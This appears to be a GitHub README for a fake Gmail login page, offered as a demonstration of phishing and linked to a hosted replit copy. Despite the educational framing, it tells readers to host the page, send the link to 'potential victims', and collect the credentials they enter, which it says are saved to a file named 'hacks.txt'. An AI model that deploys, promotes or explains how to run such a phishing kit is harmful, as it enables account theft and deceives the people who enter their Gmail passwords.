Welcome to the "Fake Gmail Login Page" GitHub repository! If the glitch and replit buttons load the repo as html use this link https://replit.com/@GilpinFamily/Gmail?s=app

This repository contains a fake Gmail login page that demonstrates how cybercriminals can create phishing attacks to steal sensitive information from their victims.

To use the fake Gmail login page, simply download the code and host it on a web server. Then, you can share the link to the login page with potential victims. Any login information entered on the page will be sent to a file named "hacks.txt".
